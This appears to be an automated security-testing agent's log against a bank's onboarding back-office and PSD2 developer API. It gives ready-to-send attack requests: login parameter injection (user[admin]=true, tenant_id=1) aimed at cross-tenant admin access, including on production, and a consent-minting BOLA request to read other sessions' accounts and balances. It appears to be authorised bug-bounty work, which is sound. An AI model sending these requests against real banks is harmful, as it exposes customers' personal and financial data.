## 2026-09-14 18:50:13 UTC [target] (model bigpickle)
[HYP] Valid-credential session-context injection grants cross-tenant admin on digital-onboarding-stage back-office
class: AUTH
asset: digital-onboarding-stage.vpbank.com/users/sign_in
confidence: 95
reasoning: fleet-wide overridden Users::SessionsController 3/3 venues (defaults 4/129/7); hidden user[tenant_id]/user[admin]/user[user_id] rendered unpinned (stage default tenant_id=7); failed-login path NEGATIVE 09-10 (context NOT written pre-auth); success-path never observed; injected params accepted without validation error on POST
evidence_needed: valid-creds POST + user[admin]=true&user[tenant_id]=1&user[user_id]=1 yields cookie whose replay diverges from anon baseline (/api/v1/tenants != `{}` or /admin/api/v1/users != 401)
verify_steps: HUMAN: GET /users/sign_in capture authenticity_token+_us_session; POST email/password+user[admin]=true&user[tenant_id]=1&user[user_id]=1+CSRF; replay GET /api/v1/tenants and /admin/api/v1/users; diff vs baseline (anon: tenants=200 `{}`, users=401)
impact: cross-tenant admin back-office session — onboarding PII, ident documents, wire status; HIGH
testability: HUMAN_ONLY
[HYP] Valid-credential session-context injection on digital-onboarding prod (success-path unobserved)
class: AUTH
asset: digital-onboarding.vpbank.com/users/sign_in
confidence: 85
reasoning: prod form renders hidden user[tenant_id]=4; overridden SessionsController confirmed; prod API stricter (tenants 403 vs dev 200); if injected tenant_id persists post-auth, tenant isolation bypass possible
evidence_needed: valid-creds POST + user[admin]=true&user[tenant_id]=1 yields cookie whose replay on /api/v1/tenants diverges from prod anon baseline (403 → 200 or non-empty)
verify_steps: HUMAN: GET /users/sign_in capture authenticity_token; POST email/password+user[admin]=true&user[tenant_id]=1+CSRF; replay GET /api/v1/tenants; diff vs prod baseline (403)
impact: cross-tenant admin session on production — PII, ident documents, wire status; CRITICAL
testability: HUMAN_ONLY
[HYP] PSD2 sandbox BOLA re-mint restores cross-session consent/account/balance read
class: IDOR
asset: developer.vpbank.com/psd2/berlin-group/v1/consents
confidence: 65
reasoning: BOLA fully proven 09-05 (anon POST 201 → fresh anon session reads consent/accounts/balances/transactions, zero binding); read path live-verified 09-14 (anchor 404, /accounts 200 `{"accounts":[]}`, /consents 405, spec 200 self-labels PSD2 production server, zero securitySchemes); 09-12 uniform-500 confirmed transient; only TTL-expired synthetic anchor blocks re-proof
evidence_needed: fresh anonymous POST mint returns consentId readable by different anonymous session (/consents/{id}/status, /accounts, /balances non-404/200)
verify_steps: HUMAN: POST /psd2/berlin-group/v1/consents body `{"access":["accounts","balances","transactions"],"recurringIndicator":true,"validUntil":"2027-03-11","frequencyPerDay":100}` + `X-Request-ID:<uuid>` + `Content-Type:application/json`; on 201 capture consentId; from fresh anonymous session GET /consents/{id}/status, /accounts, /balances
impact: cross-session consent/account/balance read on official financial API — restores standing CRITICAL-class reportable POC (synthetic data only)
testability: HUMAN_ONLY
[NEXT] HUMAN: Re-mint the sandbox BOLA anchor — POST `https://developer.vpbank.com/psd2/berlin-group/v1/consents` with `Content-Type: application/json` + `X-Request-ID: <new-uuid>` + body `{"access":["accounts","balances","transactions"],"recurringIndicator":true,"validUntil":"2027-03-11","frequencyPerDay":100}` (documented-open synthetic sandbox); on HTTP 201 capture `consentId`, then from a fresh anonymous session GET `/consents/{consentId}/status`, `/accounts`, `/balances` — non-404/200 cross-session reads re-verify the standing CRITICAL-class BOLA for the program report. (This is the single highest-leverage mutating step and the only one in-program testable without credentials.)
[RISK] vp-bank-ag: 74 — Standing CRITICAL-class sandbox financial-API BOLA (zero binding on consentId/paymentId) is one in-program synthetic POST from re-proof with a twice-live-verified healthy read path; fleet-wide overridden Devise SessionsController live at 3/3 venues (success-path still cred-gated, stage=95/prod=85); prod PSD2 carryover plausible but QWAC-gated (HUMAN_ONLY). New hostnames from CT are parked/gated/static — no material change. Residual surface unchanged-negative elsewhere.
